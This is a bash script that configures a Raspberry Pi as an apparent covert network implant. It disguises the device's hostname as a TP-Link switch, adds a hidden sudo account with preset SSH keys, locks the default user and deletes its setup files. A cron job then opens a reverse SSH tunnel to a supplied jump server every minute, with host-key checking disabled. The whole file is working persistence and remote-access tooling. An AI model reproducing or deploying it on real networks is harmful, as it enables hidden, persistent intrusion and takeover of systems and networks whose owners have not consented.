#!/bin/bash


# Output coloring
red=`tput setaf 001`
green=`tput setaf 002`
yellow=`tput setaf 003`
reset=`tput sgr0`

# Check for arguments
if [ $# -eq 0 ]
then
echo "${red} Pass this script your jump server ip address so it can persist the connection${reset}"
echo "${red} It can also be passed an optional hostname string as a second argument${reset}"
echo "${red} Syntax: ./target_config.sh <jump.server.ipv4.DNS> \"<Hostname>\"${reset}"
exit 1
fi

# Check that user has root access
if (( $EUID != 0 ))
then
  echo "${red} You must run target_config.sh as root${reset}"
  exit 1
fi

# Set locale
echo "${green} Setting the system locale${reset}"
export LANGUAGE=en_US.UTF-8
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8
sudo locale-gen en_US.UTF-8

# Set hostname (advertised on the network)
echo "${green} Setting the host name ${yellow}${2-"tplink-network-switch"}${reset}"
echo "${2-"tplink-network-switch"}" > /etc/hostname
echo "127.0.0.1       localhost" > /etc/hosts
echo "::1             localhost ip6-localhost ip6-loopback" >> /etc/hosts
echo "ff02::1         ip6-allnodes" >> /etc/hosts
echo "ff02::2         ip6-allrouters" >> /etc/hosts
echo "127.0.1.1       ${2-"tplink-network-switch"}" >> /etc/hosts

# Update all packages
echo "${green} Updating the system... this may take some time${reset}"
sudo apt update
sudo apt upgrade -y

cd $(dirname $0)

# Create a non-root user for the target server
echo "${green} creating snitch account on this machine${reset}"
mkdir /home/snitch
mkdir /home/snitch/.ssh
useradd snitch -d /home/snitch
# Set snitch password
echo "${green} Set a password for snitch${reset}"
passwd snitch
# Authorize home to login
echo "${green} Setting snitch account rules${reset}"
cat ./server-auth/authorized_keys > /home/snitch/.ssh/authorized_keys
chmod 644 /home/snitch/.ssh/authorized_keys
cat ./known/known_hosts > /home/snitch/.ssh/known_hosts
chmod 644 /home/snitch/.ssh/known_hosts
# Set public and private keys and their permissions
echo "${green} Writing ssh keys${reset}"
cat ./client-key/id_rsa > /home/snitch/.ssh/id_rsa
chmod 600 /home/snitch/.ssh/id_rsa
cat ./client-key/id_rsa.pub > /home/snitch/.ssh/id_rsa.pub
chmod 644 /home/snitch/.ssh/id_rsa.pub
# Misc additional account settigs
cp /home/pi/.bashrc /home/snitch/.bashrc
chown snitch /home/snitch/.bashrc
chown -R snitch:snitch /home/snitch
chsh -s /bin/bash snitch
usermod -aG sudo snitch


# Configure ssh server keys and universal settings
echo "${green} Setting universal ssh rules and server keys${reset}"
mkdir /etc/ssh
cat ./server-key/ssh_host_ecdsa_key > /etc/ssh/ssh_host_ecdsa_key
chmod 600 /etc/ssh/ssh_host_ecdsa_key
cat ./server-key/ssh_host_ecdsa_key.pub > /etc/ssh/ssh_host_ecdsa_key.pub
chmod 600 /etc/ssh/ssh_host_ecdsa_key.pub
cat ./server-config/ssh_config > /etc/ssh/ssh_config
chmod 644 /etc/ssh/ssh_config
cat ./server-config/sshd_config > /etc/ssh/sshd_config
chmod 644 /etc/ssh/sshd_config

# Remove setup files
echo "${green} Cleaning Up"
cd ..
rm -rf target
usermod -L pi

# Persistent Callback
echo "${green} Persisting Callback${reset}"
line="* * * * * ssh -R $1:221122:127.0.0.1:22 dummy@$1 -p 22 -N -o \"StrictHostKeyChecking no\" "
(crontab -u snitch -l; echo "$line") | crontab -u snitch -

echo "${green} ..............${reset}"
echo "${green} ..............${reset}"
echo "${green} .... ${yellow}DONE${green} ....${reset}"
echo "${green} ..............${reset}"
echo "${green} ..............${reset}"

reboot